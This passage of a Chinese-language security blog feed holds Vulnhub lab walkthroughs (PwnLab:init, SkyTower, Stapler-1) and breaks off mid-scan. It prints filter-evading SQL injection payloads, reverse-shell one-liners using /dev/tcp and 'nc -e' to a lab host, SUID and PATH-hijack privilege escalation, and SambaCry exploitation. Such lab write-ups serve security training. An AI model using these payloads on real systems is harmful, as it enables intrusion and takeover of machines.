class="line">(__  _)-._.-&#x3D;-._.-&#x3D;-._.-&#x3D;-._.-&#x3D;-._.-&#x3D;-._.-&#x3D;-._.-&#x3D;-._.-&#x3D;-._.-&#x3D;-._.-&#x3D;-._.-(__  _)</span><br><span class="line">(_ ___)  _____                             _                            (_ ___)</span><br><span class="line">(__  _) &#x2F;  __ \                           | |                           (__  _)</span><br><span class="line">( _ __) | &#x2F;  \&#x2F; ___  _ __   __ _ _ __ __ _| |_ ___                      ( _ __)</span><br><span class="line">(__  _) | |    &#x2F; _ \| &#39;_ \ &#x2F; _&#96; | &#39;__&#x2F; _&#96; | __&#x2F; __|                     (__  _)</span><br><span class="line">(_ ___) | \__&#x2F;\ (_) | | | | (_| | | | (_| | |_\__ \                     (_ ___)</span><br><span class="line">(__  _)  \____&#x2F;\___&#x2F;|_| |_|\__, |_|  \__,_|\__|___&#x2F;                     (__  _)</span><br><span class="line">( _ __)                     __&#x2F; |                                       ( _ __)</span><br><span class="line">(__  _)                    |___&#x2F;                                        (__  _)</span><br><span class="line">(__  _)                                                                 (__  _)</span><br><span class="line">(_ ___) If  you are  reading this,  means  that you have  break &#39;init&#39;  (_ ___)</span><br><span class="line">( _ __) Pwnlab.  I hope  you enjoyed  and thanks  for  your time doing  ( _ __)</span><br><span class="line">(__  _) this challenge.                                                 (__  _)</span><br><span class="line">(_ ___)                                                                 (_ ___)</span><br><span class="line">( _ __) Please send me  your  feedback or your  writeup,  I will  love  ( _ __)</span><br><span class="line">(__  _) reading it                                                      (__  _)</span><br><span class="line">(__  _)                                                                 (__  _)</span><br><span class="line">(__  _)                                             For sniferl4bs.com  (__  _)</span><br><span class="line">( _ __)                                claor@PwnLab.net - @Chronicoder  ( _ __)</span><br><span class="line">(__  _)                                                                 (__  _)</span><br><span class="line">(_ ___)-._.-&#x3D;-._.-&#x3D;-._.-&#x3D;-._.-&#x3D;-._.-&#x3D;-._.-&#x3D;-._.-&#x3D;-._.-&#x3D;-._.-&#x3D;-._.-&#x3D;-._.-(_ ___)</span><br><span class="line">&#96;-._.-&#39;                                                                 &#96;-._.-&#39;</span><br></pre></td></tr></table></figure>

<h3 id="Walkthrough-2"><a href="#Walkthrough-2" class="headerlink" title="Walkthrough-2"></a>Walkthrough-2</h3><p>切换到kane后，会发现有他的家目录下有个二进制程序msgmike，这个程序是mike的suid文件，会检测mike的家目录下有没有mike文件，然后去查看这个文件。<br><img src="https://images.atsud0.me/images/post/Screenshot_20200712_174904.jpg" alt=""><br>而我们现在是在kane用户，这个程序也没有将cat的路径写死，所以可以考虑劫持cat的环境变量。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">echo &#39;&#x2F;bin&#x2F;bash&#39; &gt; &#x2F;tmp&#x2F;cat</span><br><span class="line">export PATH&#x3D;&#x2F;tmp:$PATH</span><br><span class="line">chmod +x &#x2F;tmp&#x2F;cat</span><br><span class="line">.&#x2F;msgmike</span><br></pre></td></tr></table></figure>
<p>此时应该会变成mike用户。</p>
<p>而mike用户的家目录下又有一个root用户的suid位文件。但是这个程序是请求输入，然后执行<code>echo 用户输入的值 &gt;&gt; /root/msg.txt</code><br><img src="https://images.atsud0.me/images/post/Screenshot_20200712_175252.jpg" alt=""><br>嗯哼，可以直接<code>./msg2root</code>运行，并输入`chmod +s /bin/bash` ，使用反引号优先运行<code>chmod +s /bin/bash</code>将bash变成一个root用户的suid位文件。接着，我们就可以在mike用户下执行<code>bash -p</code>获得root权限。</p>
<p><img src="https://images.atsud0.me/images/post/Screenshot_20200712_175542.jpg" alt=""></p>
<h2 id="0x04-总结"><a href="#0x04-总结" class="headerlink" title="0x04 总结"></a>0x04 总结</h2><p>能代码审计的时候就要细心审。</p>
]]></content>
      <categories>
        <category>靶机实验</category>
        <category>Vulnhub</category>
      </categories>
      <tags>
        <tag>LFI</tag>
        <tag>CVE-2016-5195</tag>
        <tag>环境变量劫持</tag>
        <tag>pwn</tag>
      </tags>
  </entry>
  <entry>
    <title>Vulnhub-SkyTower</title>
    <url>/2020/07/12/Vulnhub-SkyTower/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><p><a href="https://www.vulnhub.com/entry/skytower-1,96/" target="_blank" rel="noopener">靶机下载链接</a></p>
<a id="more"></a>

<h2 id="0x01-信息收集"><a href="#0x01-信息收集" class="headerlink" title="0x01 信息收集"></a>0x01 信息收集</h2><h3 id="nmap扫描"><a href="#nmap扫描" class="headerlink" title="nmap扫描"></a>nmap扫描</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nmap -p22,80,3128 -sC -sV -O 192.168.56.3</span><br><span class="line"></span><br><span class="line">Nmap scan report for 192.168.56.3</span><br><span class="line">Host is up (0.00083s latency).</span><br><span class="line"></span><br><span class="line">PORT     STATE    SERVICE    VERSION</span><br><span class="line">22&#x2F;tcp   filtered ssh</span><br><span class="line">80&#x2F;tcp   open     http       Apache httpd 2.2.22 ((Debian))</span><br><span class="line">|_http-server-header: Apache&#x2F;2.2.22 (Debian)</span><br><span class="line">|_http-title: Site doesn&#39;t have a title (text&#x2F;html).</span><br><span class="line">3128&#x2F;tcp open     http-proxy Squid http proxy 3.1.20</span><br><span class="line">|_http-server-header: squid&#x2F;3.1.20</span><br><span class="line">|_http-title: ERROR: The requested URL could not be retrieved</span><br><span class="line">MAC Address: 08:00:27:54:4A:37 (Oracle VirtualBox virtual NIC)</span><br><span class="line">Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port</span><br><span class="line">Device type: general purpose</span><br><span class="line">Running: Linux 3.X</span><br><span class="line">OS CPE: cpe:&#x2F;o:linux:linux_kernel:3</span><br><span class="line">OS details: Linux 3.2 - 3.10, Linux 3.2 - 3.16</span><br><span class="line">Network Distance: 1 hop</span><br><span class="line"></span><br><span class="line">OS and Service detection performed. Please report any incorrect results at https:&#x2F;&#x2F;nmap.org&#x2F;submit&#x2F; .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 37.12 seconds</span><br></pre></td></tr></table></figure>

<h3 id="目录扫描"><a href="#目录扫描" class="headerlink" title="目录扫描"></a>目录扫描</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;.htaccess (Status: 403)</span><br><span class="line">&#x2F;.htpasswd (Status: 403)</span><br><span class="line">&#x2F;background (Status: 200)</span><br><span class="line">&#x2F;cgi-bin&#x2F; (Status: 403)</span><br><span class="line">&#x2F;index (Status: 200)</span><br><span class="line">&#x2F;login.php (Status: 200)</span><br><span class="line">&#x2F;server-status (Status: 403)</span><br></pre></td></tr></table></figure>

<h3 id="nikto扫描"><a href="#nikto扫描" class="headerlink" title="nikto扫描"></a>nikto扫描</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nikto -h http:&#x2F;&#x2F;192.168.56.3</span><br><span class="line">- Nikto v2.1.6</span><br><span class="line">---------------------------------------------------------------------------</span><br><span class="line">+ Target IP:          192.168.56.3</span><br><span class="line">+ Target Hostname:    192.168.56.3</span><br><span class="line">+ Target Port:        80</span><br><span class="line">+ Start Time:         2020-07-12 12:44:05 (GMT8)</span><br><span class="line">---------------------------------------------------------------------------</span><br><span class="line">+ Server: Apache&#x2F;2.2.22 (Debian)</span><br><span class="line">+ Server leaks inodes via ETags, header found with file &#x2F;, inode: 87, size: 1136, mtime: Fri Jun 20 19:23:36 2014</span><br><span class="line">+ The anti-clickjacking X-Frame-Options header is not present.</span><br><span class="line">+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS</span><br><span class="line">+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type</span><br><span class="line">+ Uncommon header &#39;tcn&#39; found, with contents: list</span><br><span class="line">+ Apache mod_negotiation is enabled with MultiViews, which allows attackers to easily brute force file names. See http:&#x2F;&#x2F;www.wisec.it&#x2F;sectou.php?id&#x3D;4698ebdc59d15. The following alternatives for &#39;index&#39; were found: index.html</span><br><span class="line">+ Apache&#x2F;2.2.22 appears to be outdated (current is at least Apache&#x2F;2.4.12). Apache 2.0.65 (final release) and 2.2.29 are also current.</span><br><span class="line">+ Retrieved x-powered-by header: PHP&#x2F;5.4.4-14+deb7u9</span><br><span class="line">+ Allowed HTTP Methods: GET, HEAD, POST, OPTIONS</span><br><span class="line">+ OSVDB-3233: &#x2F;icons&#x2F;README: Apache default file found.</span><br><span class="line">+ &#x2F;login.php: Admin login page&#x2F;section found.</span><br><span class="line">+ 8346 requests: 0 error(s) and 11 item(s) reported on remote host</span><br><span class="line">+ End Time:           2020-07-12 12:44:36 (GMT8) (31 seconds)</span><br><span class="line">---------------------------------------------------------------------------</span><br><span class="line">+ 1 host(s) tested</span><br></pre></td></tr></table></figure>

<h2 id="0x02-漏洞利用"><a href="#0x02-漏洞利用" class="headerlink" title="0x02 漏洞利用"></a>0x02 漏洞利用</h2><h3 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h3><p>经过探索，我发现首页的登录页面存在sql注入，并且去空了or,不仅如此，它还过滤了select 和逗号，等号，and。人都傻了<br><img src="https://images.atsud0.me/images/post/Screenshot_20200712_094527.jpg" alt=""></p>
<figure class="highlight plain"><figcaption><span>sql-post</span></figcaption><table><tr><td class="code"><pre><span class="line">email&#x3D;&#39; oorrder by 3 # &amp;password&#x3D;1</span><br><span class="line"></span><br><span class="line">email&#x3D;&#39; union ALL sselectelect * FROM ((sselectelect 1)a JOIN (sselectelect 2)b JOIN (sselectelect 3)c) # &amp;password&#x3D;1</span><br><span class="line"></span><br><span class="line">email&#x3D;&#39; union ALL sselectelect * FROM ((sselectelect 1)a JOIN (sselectelect version())b JOIN (sselectelect 3)c) # &amp;password&#x3D;1</span><br><span class="line"></span><br><span class="line">email&#x3D;&#39; union ALL sselectelect * FROM ((sselectelect 1)a JOIN (sselectelect database())b JOIN (sselectelect 3)c) # &amp;password&#x3D;1</span><br><span class="line"></span><br><span class="line">email&#x3D;&#39; union sselectelect * FROM ((sselectelect 1)a JOIN (sselectelect group_concat(table_name) from infoorrmation_schema.tables where table_schema like &#39;SkyTech&#39; )b JOIN (sselectelect 3)c) # &amp;password&#x3D;1</span><br><span class="line"></span><br><span class="line">email&#x3D;&#39; union sselectelect * FROM ((sselectelect 1)a JOIN (sselectelect group_concat(column_name) from infoorrmation_schema.columns where table_schema like &#39;SkyTech&#39; aandnd table_name like &#39;login&#39;)b JOIN (sselectelect 3)c) # &amp;password&#x3D;1</span><br><span class="line"></span><br><span class="line">email&#x3D;&#39; union sselectelect * FROM ((sselectelect 1)a JOIN (sselectelect group_concat(email) from login)b JOIN (sselectelect group_concat(passwoorrd) from login)c) # &amp;password&#x3D;1</span><br></pre></td></tr></table></figure>

<p>成功爆破数据库后，会发现出来的页面是一个提示登录到ssh。已经给出了密码。通过sql注入点读取了/etc/passwd，确认了的确是有这三个用户的存在。接下来就要考虑该如何连进去了，因为22端口有防火墙的保护。</p>
<p>使用proxychains连接目标机器的squid http proxy代理。</p>
<h3 id="设置代理"><a href="#设置代理" class="headerlink" title="设置代理"></a>设置代理</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[ProxyList]</span><br><span class="line"># add proxy here ...</span><br><span class="line"># meanwile</span><br><span class="line"># defaults set to &quot;tor&quot;</span><br><span class="line">#socks4         127.0.0.1 9050</span><br><span class="line">http 192.168.56.3 3128</span><br></pre></td></tr></table></figure>

<p>之后就<code>proxychains ssh john@192.168.56.3</code>。但是会立刻闪退，谷歌之后猜测应该是目标机器设置了UsePAM yes的。三个用户我都尝试去登录了，只有william这个用户登录失败。同样的sara和john只要一连接上去就会退出。<br><img src="https://images.atsud0.me/images/post/Screenshot_20200712_121353.jpg" alt=""></p>
<p>这样的话，尝试直接ssh登录之后就运行命令如何?</p>
<h3 id="弹shell"><a href="#弹shell" class="headerlink" title="弹shell"></a>弹shell</h3><p>一开始尝试 bash反弹shell</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">proxychains ssh john@192.168.56.3 &quot;bash -c &#39;bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;192.168.56.254&#x2F;1234 0&gt;&amp;1&#39;&quot;</span><br></pre></td></tr></table></figure>
<p>但是很遗憾不行，一运行这个命令，虽然是接受到了监听，但是两边都退出了。虽然反弹失败了，但是我们是不是可以考虑正向弹shell呢？<br><img src="https://images.atsud0.me/images/post/Screenshot_20200712_122608.jpg" alt=""></p>
<p>果然成功的收到了shell。</p>
<p>尝试其他反弹shell的命令</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">msfvenom -p cmd&#x2F;unix&#x2F;reverse_bash LHOST&#x3D;192.168.56.254 LPORT&#x3D;1234</span><br><span class="line">0&lt;&amp;177-;exec 177&lt;&gt;&#x2F;dev&#x2F;tcp&#x2F;192.168.56.254&#x2F;1234;sh &lt;&amp;177 &gt;&amp;177 2&gt;&amp;177</span><br><span class="line"></span><br><span class="line">p4 ssh john@192.168.56.3 &quot;0&lt;&amp;177-;exec 177&lt;&gt;&#x2F;dev&#x2F;tcp&#x2F;192.168.56.254&#x2F;1234;sh &lt;&amp;177 &gt;&amp;177 2&gt;&amp;177&quot;</span><br></pre></td></tr></table></figure>
<p>这个命令也成功了。</p>
<p>nc反弹也可以</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">p4 ssh john@192.168.56.3 &quot;nc 192.168.56.254 1234 -e &#x2F;bin&#x2F;sh&quot;</span><br></pre></td></tr></table></figure>

<h2 id="0x03-提权"><a href="#0x03-提权" class="headerlink" title="0x03 提权"></a>0x03 提权</h2><p>拿到反弹shell后，我使用john用户进行了信息枚举，但是没发现什么特别的东西。随后我切换到了sara。发现这个用户能够执行sudo命令。<br><img src="https://images.atsud0.me/images/post/Screenshot_20200712_123740.jpg" alt=""></p>
<p>能够使用/bin/cat 查看/accounts下的任意文件。那么我们就可以</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo cat &#x2F;accounts&#x2F;..&#x2F;root&#x2F;flag.txt</span><br></pre></td></tr></table></figure>
<p><img src="https://images.atsud0.me/images/post/Screenshot_20200712_120618.jpg" alt=""></p>
<h2 id="0x04-总结"><a href="#0x04-总结" class="headerlink" title="0x04 总结"></a>0x04 总结</h2><p>多尝试姿势。。<code>bash -c &#39;bash -i ...&#39;</code>不是万能的。</p>
<h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p>-<a href="https://drops.blbana.cc/2017/05/20/SQLi-%E2%80%94%E2%80%94-%E9%80%97%E5%8F%B7%EF%BC%8C%E7%A9%BA%E6%A0%BC%EF%BC%8C%E5%AD%97%E6%AE%B5%E5%90%8D%E8%BF%87%E6%BB%A4%E7%AA%81%E7%A0%B4/" target="_blank" rel="noopener">SQLi-——-逗号，空格，字段名过滤突破</a><br>-<a href="https://www.vpsvt.com/reed/415.html" target="_blank" rel="noopener">ssh登录时出现闪退问题解决方法</a></p>
]]></content>
      <categories>
        <category>靶机实验</category>
        <category>Vulnhub</category>
      </categories>
      <tags>
        <tag>sql-injection</tag>
      </tags>
  </entry>
  <entry>
    <title>Vulnhub-Stapler-1</title>
    <url>/2020/06/20/Vulnhub-Stapler-1/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><p>这个同样是备考OSCP靶机清单中的其中一个</p>
<p>下载链接<a href="https://www.vulnhub.com/entry/stapler-1,150/" title="" target="">stapler</a></p>
<a id="more"></a>

<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>nmap扫描结果</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Starting Nmap 7.80 ( https:&#x2F;&#x2F;nmap.org ) at 2020-06-19 22:07 CST</span><br><span class="line">Nmap scan report for 192.168.56.139</span><br><span class="line">Host is up (0.00036s latency).</span><br><span class="line"></span><br><span class="line">PORT      STATE  SERVICE     VERSION</span><br><span class="line">20&#x2F;tcp    closed ftp-data</span><br><span class="line">21&#x2F;tcp    open   ftp         vsftpd 2.0.8 or later</span><br><span class="line">| ftp-anon: Anonymous FTP login allowed (FTP code 230)</span><br><span class="line">|_Can&#39;t get directory listing: PASV failed: 550 Permission denied.</span><br><span class="line">| ftp-syst:</span><br><span class="line">|   STAT:</span><br><span class="line">| FTP server status:</span><br><span class="line">|      Connected to 192.168.56.1</span><br><span class="line">|      Logged in as ftp</span><br><span class="line">|      TYPE: ASCII</span><br><span class="line">|      No session bandwidth limit</span><br><span class="line">|      Session timeout in seconds is 300</span><br><span class="line">|      Control connection is plain text</span><br><span class="line">|      Data connections will be plain text</span><br><span class="line">|      At session startup, client count was 2</span><br><span class="line">|      vsFTPd 3.0.3 - secure, fast, stable</span><br><span class="line">|_End of status</span><br><span class="line">22&#x2F;tcp    open   ssh         OpenSSH 7.2p2 Ubuntu 4 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">| ssh-hostkey:</span><br><span class="line">|   2048 81:21:ce:a1:1a:05:b1:69:4f:4d:ed:80:28:e8:99:05 (RSA)</span><br><span class="line">|   256 5b:a5:bb:67:91:1a:51:c2:d3:21:da:c0:ca:f0:db:9e (ECDSA)</span><br><span class="line">|_  256 6d:01:b7:73:ac:b0:93:6f:fa:b9:89:e6:ae:3c:ab:d3 (ED25519)</span><br><span class="line">53&#x2F;tcp    open   domain      dnsmasq 2.75</span><br><span class="line">| dns-nsid:</span><br><span class="line">|_  bind.version: dnsmasq-2.75</span><br><span class="line">80&#x2F;tcp    open   http        PHP cli server 5.5 or later</span><br><span class="line">|_http-title: 404 Not Found</span><br><span class="line">123&#x2F;tcp   closed ntp</span><br><span class="line">137&#x2F;tcp   closed netbios-ns</span><br><span class="line">138&#x2F;tcp   closed netbios-dgm</span><br><span class="line">139&#x2F;tcp   open   netbios-ssn Samba smbd 4.3.9-Ubuntu (workgroup: WORKGROUP)</span><br><span class="line">666&#x2F;tcp   open   tcpwrapped</span><br><span class="line">3306&#x2F;tcp  open   mysql       MySQL 5.7.12-0ubuntu1</span><br><span class="line">| mysql-info:</span><br><span class="line">|   Protocol: 10</span><br><span class="line">|   Version: 5.7.12-0ubuntu1</span><br><span class="line">|   Thread ID: 9</span><br><span class="line">|   Capabilities flags: 63487</span><br><span class="line">|   Some Capabilities: Speaks41ProtocolNew, IgnoreSpaceBeforeParenthesis, FoundRows, IgnoreSigpipes, SupportsTransactions, DontAllowDatabaseTableColumn, Support41Auth, LongPassword, InteractiveClient, Speaks41ProtocolOld, ConnectWithDatabase, SupportsLoadDataLocal, ODBCClient, SupportsCompression, LongColumnFlag, SupportsMultipleResults, SupportsAuthPlugins, SupportsMultipleStatments</span><br><span class="line">|   Status: Autocommit</span><br><span class="line">|   Salt: &quot;s\x04xO\x1F%\x07j2&lt;\x06i&#39;j\x02       \x12t\x0B</span><br><span class="line">|_  Auth Plugin Name: mysql_native_password</span><br><span class="line">12380&#x2F;tcp open   http        Apache httpd 2.4.18 ((Ubuntu))</span><br><span class="line">|_http-server-header: Apache&#x2F;2.4.18 (Ubuntu)</span><br><span class="line">|_http-title: Tim, we need to-do better next year for Initech</span><br><span class="line">Service Info: Host: RED; OS: Linux; CPE: cpe:&#x2F;o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">Host script results:</span><br><span class="line">|_clock-skew: mean: 7h39m57s, deviation: 34m38s, median: 7h59m57s</span><br><span class="line">|_nbstat: NetBIOS name: RED, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: &lt;unknown&gt; (unknown)</span><br><span class="line">| smb-os-discovery:</span><br><span class="line">|   OS: Windows 6.1 (Samba 4.3.9-Ubuntu)</span><br><span class="line">|   Computer name: red</span><br><span class="line">|   NetBIOS computer name: RED\x00</span><br><span class="line">|   Domain name: \x00</span><br><span class="line">|   FQDN: red</span><br><span class="line">|_  System time: 2020-06-19T23:07:17+01:00</span><br><span class="line">| smb-security-mode:</span><br><span class="line">|   account_used: guest</span><br><span class="line">|   authentication_level: user</span><br><span class="line">|   challenge_response: supported</span><br><span class="line">|_  message_signing: disabled (dangerous, but default)</span><br><span class="line">| smb2-security-mode:</span><br><span class="line">|   2.02:</span><br><span class="line">|_    Message signing enabled but not required</span><br><span class="line">| smb2-time:</span><br><span class="line">|   date: 2020-06-19T22:07:18</span><br><span class="line">|_  start_date: N&#x2F;A</span><br></pre></td></tr></table></figure>

<p>扫描目录后发现.bashrc和.profile 下载回来一看，我发现好像都没什么帮助的。<br><img src="https://images.atsud0.me/images/post/Screenshot_20200619_224928.jpg" alt=""></p>
<p>nikto 扫描<br><img src="https://images.atsud0.me/images/post/Screenshot_20200620_153622.jpg" alt=""><br>80端口的扫描看起来是没什么帮助的。所以再次扫描12380端口。<br><img src="https://images.atsud0.me/images/post/Screenshot_20200620_154505.jpg" alt=""><br>咦，nikto显示找到了两个路径</p>
<ul>
<li>admin112233</li>
<li>blogblog</li>
</ul>
<p>但是用http去无法访问，尝试用https成功<br><img src="https://images.atsud0.me/images/post/Screenshot_20200620_154744.jpg" alt=""></p>
<p>看起来是个wordpress博客</p>
<p>去看看admin112233<br><img src="https://images.atsud0.me/images/post/Screenshot_20200620_155035.jpg" alt="">确定之后就被重定向到了xss payloads了</p>
<p>robots.txt</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">User-agent: *</span><br><span class="line">Disallow: &#x2F;admin112233&#x2F;</span><br><span class="line">Disallow: &#x2F;blogblog&#x2F;</span><br></pre></td></tr></table></figure>


<p>smb目录探测<br><img src="https://images.atsud0.me/images/post/Screenshot_20200619_221240.jpg" alt=""></p>
<p>尝试连接<br><img src="https://images.atsud0.me/images/post/Screenshot_20200619_222208.jpg" alt=""><br>在backup里面了找到了vsftpd.conf发现匿名用户的配置选项是打开的。先去看看ftp有什么东西</p>
<p><img src="https://images.atsud0.me/images/post/Screenshot_20200619_222339.jpg" alt=""><br>ftp目录中只有一个文件，其内容为：</p>
<blockquote>
<p>Elly, make sure you update the payload information. Leave it in your FTP account once your are done, John.<br>Elly，请确保您更新了有效负载信息。完成后，将其保留在您的FTP帐户中，约翰。</p>
</blockquote>
<p>有效负载信息是什么？。。真是吃了文化的亏。。ftp匿名用户目录看起来没什么信息了，继续回去samba目录。<br>很可惜backup目录下的wordpress.tar.gz并不是网站的备份，只是一个安装包。</p>
<p>kathy_stuff目录下只有一个todolist，内容为</p>
<blockquote>
<p>I’m making sure to backup anything important for Initech, Kathy</p>
</blockquote>
<p><img src="https://images.atsud0.me/images/post/Screenshot_20200619_223422.jpg" alt=""></p>
<p>好像没什么线索了，，所以目前为止找到了Kathy，John，Elly，Harry,zoe这四个好像是目标服务器的中的用户名。</p>
<p>连接samba的tmp目录<br><img src="https://images.atsud0.me/images/post/Screenshot_20200619_224444.jpg" alt=""></p>
<p>只有一个ls文件，内容是<br><img src="https://images.atsud0.me/images/post/Screenshot_20200619_224600.jpg" alt=""></p>
<p>好像不会更新的。</p>
<p>到这里，smb和ftp的线索就断了。我被困住了，尝试检索服务器运行服务的版本的漏洞</p>
<h2 id="sambacry-提权"><a href="#sambacry-提权" class="headerlink" title="sambacry 提权"></a>sambacry 提权</h2><p><img src="https://images.atsud0.me/images/post/Screenshot_20200620_121441.jpg" alt=""><br>符合目标版本的好像只有42084.rb.看了一下内容是<a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-7494" title="" target="">CVE-2017-7494</a>的漏洞编号而且是rb脚本，直接上msf。<br><img src="https://images.atsud0.me/images/post/Screenshot_20200620_120304.jpg" alt=""><br><img src="https://images.atsud0.me/images/post/Screenshot_20200620_121336.jpg" alt=""></p>
<p>提权成功。</p>
<p>这应该就是最轻松的提权方式了把。。。</p>
<h3 id="尝试使用非msf框架的exp"><a href="#尝试使用非msf框架的exp" class="headerlink" title="尝试使用非msf框架的exp"></a>尝试使用非msf框架的exp</h3><p>下载地址:<a href="https://github.com/joxeankoret/CVE-2017-7494/" title="" target="">exp-joxeankoret-CVE-2017-7494</a><br>目标机器samba版本4.3.9利用不成功<br><img src="https://images.atsud0.me/images/post/Screenshot_20200620_124321.jpg" alt=""></p>
<p>exp<a href="https://www.exploit-db.com/exploits/42060" title="" target="">42060 sambacry exp</a><br>同样也是不成功，，不会改（脚本小子就是脚本小子，真的废物<br><img src="https://images.atsud0.me/images/post/Screenshot_20200620_143606.jpg" alt=""></p>
<p>同样尝试了这个<a href="https://github.com/opsxcq/exploit-CVE-2017-7494" title="" target="">exp</a>也是不成功<br><img src="https://images.atsud0.me/images/post/Screenshot_20200620_144226.jpg" alt=""></p>
<p>讲道理，感觉其他的exp也是能执行的啊。。为什么就msf的可以。难道是和我本机的环境有关？我暂且蒙在古里。想到这里，我又回去尝试了msf的exp，还是成功。我重新看了一下<a href="https://www.exploit-db.com/exploits/42060" title="" target="">42060 sambacry exp</a>的帮助命令，发现有一个参数。-x 看了这个参数之后，我就想是不是会和目标机器的系统架构有关，而这个脚本默认的是X8664的so文件，在32位的机器上无法执行。所以一直没有成功。想到这里 我将-x这个参数加上去了，结果就成功了。。。<br><img src="https://images.atsud0.me/images/post/Screenshot_20200620_152314.jpg" alt=""></p>
<p><img src="https://images.atsud0.me/images/post/Screenshot_20200620_153300.jpg" alt=""></p>
<p><img src="https://images.atsud0.me/images/post/Screenshot_20200620_153324.jpg" alt=""></p>
<p>。。此时只想喷自己是弱智</p>
<h2 id="漏洞利用-拿webshell"><a href="#漏洞利用-拿webshell" class="headerlink" title="漏洞利用-拿webshell"></a>漏洞利用-拿webshell</h2><p>使用wpscan扫描目标博客</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">wpscan --url &quot;https:&#x2F;&#x2F;192.168.56.139:12380&#x2F;blogblog&#x2F;&quot; --disable-tls-checks</span><br><span class="line"></span><br><span class="line">[+] URL: https:&#x2F;&#x2F;192.168.56.139:12380&#x2F;blogblog&#x2F; [192.168.56.139]</span><br><span class="line">[+] Started: Sat Jun 20 04:02:20 2020</span><br><span class="line"></span><br><span class="line">Interesting Finding(s):</span><br><span class="line"></span><br><span class="line">[+] Headers</span><br><span class="line"> | Interesting Entries:</span><br><span class="line"> |  - Server: Apache&#x2F;2.4.18 (Ubuntu)</span><br><span class="line"> |  - Dave: Soemthing doesn&#39;t look right here</span><br><span class="line"> | Found By: Headers (Passive Detection)</span><br><span class="line"> | Confidence: 100%</span><br><span class="line"></span><br><span class="line">[+] XML-RPC seems to be enabled: https:&#x2F;&#x2F;192.168.56.139:12380&#x2F;blogblog&#x2F;xmlrpc.php</span><br><span class="line"> | Found By: Headers (Passive Detection)</span><br><span class="line"> | Confidence: 100%</span><br><span class="line"> | Confirmed By:</span><br><span class="line"> |  - Link Tag (Passive Detection), 30% confidence</span><br><span class="line"> |  - Direct Access (Aggressive Detection), 100% confidence</span><br><span class="line"> | References:</span><br><span class="line"> |  - http:&#x2F;&#x2F;codex.wordpress.org&#x2F;XML-RPC_Pingback_API</span><br><span class="line"> |  - https:&#x2F;&#x2F;www.rapid7.com&#x2F;db&#x2F;modules&#x2F;auxiliary&#x2F;scanner&#x2F;http&#x2F;wordpress_ghost_scanner</span><br><span class="line"> |  - https:&#x2F;&#x2F;www.rapid7.com&#x2F;db&#x2F;modules&#x2F;auxiliary&#x2F;dos&#x2F;http&#x2F;wordpress_xmlrpc_dos</span><br><span class="line"> |  - https:&#x2F;&#x2F;www.rapid7.com&#x2F;db&#x2F;modules&#x2F;auxiliary&#x2F;scanner&#x2F;http&#x2F;wordpress_xmlrpc_login</span><br><span class="line"> |  - https:&#x2F;&#x2F;www.rapid7.com&#x2F;db&#x2F;modules&#x2F;auxiliary&#x2F;scanner&#x2F;http&#x2F;wordpress_pingback_access</span><br><span class="line"></span><br><span class="line">[+] https:&#x2F;&#x2F;192.168.56.139:12380&#x2F;blogblog&#x2F;readme.html</span><br><span class="line"> | Found By: Direct Access (Aggressive Detection)</span><br><span class="line"> | Confidence: 100%</span><br><span class="line"></span><br><span class="line">[+] Registration is enabled: https:&#x2F;&#x2F;192.168.56.139:12380&#x2F;blogblog&#x2F;wp-login.php?action&#x3D;register</span><br><span class="line"> | Found By: Direct Access (Aggressive Detection)</span><br><span class="line"> | Confidence: 100%</span><br><span class="line"></span><br><span class="line">[+] Upload directory has listing enabled: https:&#x2F;&#x2F;192.168.56.139:12380&#x2F;blogblog&#x2F;wp-content&#x2F;uploads&#x2F;</span><br><span class="line"> | Found By: Direct Access (Aggressive Detection)</span><br><span class="line"> | Confidence: 100%</span><br><span class="line"></span><br><span class="line">[+] The external WP-Cron seems to be enabled: https:&#x2F;&#x2F;192.168.56.139:12380&#x2F;blogblog&#x2F;wp-cron.php</span><br><span class="line"> | Found By: Direct Access (Aggressive Detection)</span><br><span class="line"> | Confidence: 60%</span><br><span class="line"> | References:</span><br><span class="line"> |  - https:&#x2F;&#x2F;www.iplocation.net&#x2F;defend-wordpress-from-ddos</span><br><span class="line"> |  - https:&#x2F;&#x2F;github.com&#x2F;wpscanteam&#x2F;wpscan&#x2F;issues&#x2F;1299</span><br><span class="line"></span><br><span class="line">[+] WordPress version 4.2.1 identified (Insecure, released on 2015-04-27).</span><br><span class="line"> | Found By: Rss Generator (Passive Detection)</span><br><span class="line"> |  - https:&#x2F;&#x2F;192.168.56.139:12380&#x2F;blogblog&#x2F;?feed&#x3D;rss2, 